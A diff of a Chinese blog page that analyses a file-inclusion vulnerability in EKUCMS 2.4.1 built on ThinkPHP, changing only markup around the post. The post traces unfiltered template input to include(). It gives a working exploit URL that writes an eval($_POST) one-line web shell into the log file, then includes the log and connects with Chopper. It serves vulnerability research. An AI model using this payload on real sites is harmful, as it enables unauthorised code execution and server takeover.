@@ -234,7 +234,7 @@
     </button>
 
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x01-先说说文件包含的关键函数"><span class="post-toc-number">1.</span> <span class="post-toc-text">0x01 先说说文件包含的关键函数</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x02-代码分析："><span class="post-toc-number">2.</span> <span class="post-toc-text">0x02 代码分析：</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x03-漏洞利用"><span class="post-toc-number">3.</span> <span class="post-toc-text">0x03 漏洞利用</span></a></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#undefined"><span class="post-toc-number">1.</span> <span class="post-toc-text">0x01 先说说文件包含的关键函数</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#undefined"><span class="post-toc-number">2.</span> <span class="post-toc-text">0x02 代码分析：</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#undefined"><span class="post-toc-number">3.</span> <span class="post-toc-text">0x03 漏洞利用</span></a></li></ol>
 
         <!--
         <li class="mdl-menu__item">
@@ -388,22 +388,40 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h4 id="0x01-先说说文件包含的关键函数"><a href="#0x01-先说说文件包含的关键函数" class="headerlink" title="0x01 先说说文件包含的关键函数"></a>0x01 先说说文件包含的关键函数</h4><p>php文件包含函数include、include_once、require、require_once 区别</p>
+        <h4>0x01 先说说文件包含的关键函数</h4>
+<p>php文件包含函数include、include_once、require、require_once 区别</p>
 <p>1、在错误的处理上</p>
 <p>require()语句在遇到包含文件不存在，或是出错的时候，就停止即行，并报错。include()则继续即行。</p>
-<p>ps：在PHP4.3.5之前不会报错<br><a id="more"></a><br>如果你想在出错的地方就停止程序，那么你就选择require吧。include()就不是这样，程序还是会运行，同时要保证包含路径是正确的。</p>
-<p>2、include（）<br>include()语句将在其被调用的位置处包含一个文件。包含后运行包含的文件。</p>
-<p>3、include_once()<br>include_once()在执行包含文件并运行文件，这和include（）类似，唯一不同的是include_once()会判断是否已经执行过，如果已经包含，则忽略这次包含。</p>
-<p>4、require()<br>require()在很大的程度上和include()相同，有两个重要的区别。首先无论执行的语句如何，只要出现了require(filename)，就会包含这个文件，即使语句是false。其次看上文中的1。</p>
-<p>5、require_once()<br>require_once()在很大程度上和require()相同。唯一的区别就是require_once()会判断包含的文件是不是已经被执行过，避免函数的重定义和变量重新赋值。</p>
-<h4 id="0x02-代码分析："><a href="#0x02-代码分析：" class="headerlink" title="0x02 代码分析："></a>0x02 代码分析：</h4><p>路径：/core/Lib/Action/Home/MyAction.class.php</p>
+<p>ps：在PHP4.3.5之前不会报错
+&lt;!--more--&gt;
+如果你想在出错的地方就停止程序，那么你就选择require吧。include()就不是这样，程序还是会运行，同时要保证包含路径是正确的。</p>
+<p>2、include（）
+include()语句将在其被调用的位置处包含一个文件。包含后运行包含的文件。</p>
+<p>3、include_once()
+include_once()在执行包含文件并运行文件，这和include（）类似，唯一不同的是include_once()会判断是否已经执行过，如果已经包含，则忽略这次包含。</p>
+<p>4、require()
+require()在很大的程度上和include()相同，有两个重要的区别。首先无论执行的语句如何，只要出现了require(filename)，就会包含这个文件，即使语句是false。其次看上文中的1。</p>
+<p>5、require_once()
+require_once()在很大程度上和require()相同。唯一的区别就是require_once()会判断包含的文件是不是已经被执行过，避免函数的重定义和变量重新赋值。</p>
+<h4>0x02 代码分析：</h4>
+<p>路径：/core/Lib/Action/Home/MyAction.class.php</p>
 <p>1、$id变量来自于GET传入，之后又传到了display函数，display函数的参数是模板的名称。</p>
-<p><img src="http://obh16g4rw.bkt.clouddn.com/46.png" alt=""><br>2、跟踪display函数，传值到模板处理函数fetch()   view.class.php(163-210）<br><img src="http://obh16g4rw.bkt.clouddn.com/47.png" alt=""> </p>
-<p>调用非默认模板，模板阵列分量分解直接载入模板，没有做过滤处理，直接include<br>3、对包含文件的处理 /core/ThinkPHP/Lib/Think/Core/View.class.php (374-391)<br><img src="http://obh16g4rw.bkt.clouddn.com/48.png" alt=""></p>
+<p><img src="http://obh16g4rw.bkt.clouddn.com/46.png" alt="">
+2、跟踪display函数，传值到模板处理函数fetch()   view.class.php(163-210）
+<img src="http://obh16g4rw.bkt.clouddn.com/47.png" alt=""></p>
+<p>调用非默认模板，模板阵列分量分解直接载入模板，没有做过滤处理，直接include
+3、对包含文件的处理 /core/ThinkPHP/Lib/Think/Core/View.class.php (374-391)
+<img src="http://obh16g4rw.bkt.clouddn.com/48.png" alt=""></p>
 <p>直接引入其他模板的操作，无任何过滤</p>
-<h4 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h4><p>1、通过以上函数的跟踪，发现包含点，构造一句话，利用thinphp日志记录，写入一句话</p>
-<p>exp：<a href="http://localhost/ekucms2.4.1/index.php?s=my/show/id/{~eval($_POST[LED])}" target="_blank" rel="external">http://localhost/ekucms2.4.1/index.php?s=my/show/id/{~eval($_POST[LED])}</a><br><img src="http://obh16g4rw.bkt.clouddn.com/49.png" alt=""><br><img src="http://obh16g4rw.bkt.clouddn.com/50.png" alt=""></p>
-<p>2、包含一句话（利用日志文件）<br> <img src="http://obh16g4rw.bkt.clouddn.com/51.png" alt=""><br>3、菜刀连接<br><img src="http://obh16g4rw.bkt.clouddn.com/52.png" alt=""></p>
+<h4>0x03 漏洞利用</h4>
+<p>1、通过以上函数的跟踪，发现包含点，构造一句话，利用thinphp日志记录，写入一句话</p>
+<p>exp：http://localhost/ekucms2.4.1/index.php?s=my/show/id/{~eval($_POST[LED])}
+<img src="http://obh16g4rw.bkt.clouddn.com/49.png" alt="">
+<img src="http://obh16g4rw.bkt.clouddn.com/50.png" alt=""></p>
+<p>2、包含一句话（利用日志文件）
+<img src="http://obh16g4rw.bkt.clouddn.com/51.png" alt="">
+3、菜刀连接
+<img src="http://obh16g4rw.bkt.clouddn.com/52.png" alt=""></p>
 
     
 
@@ -573,6 +591,14 @@
     
 
     <!-- Article Number  -->
+    
+        <li>
+            <a href="/archives">
+                文章总数
+                <span class="sidebar-badge">15</span>
+            </a>
+        </li>
+        
     
 </ul>
 
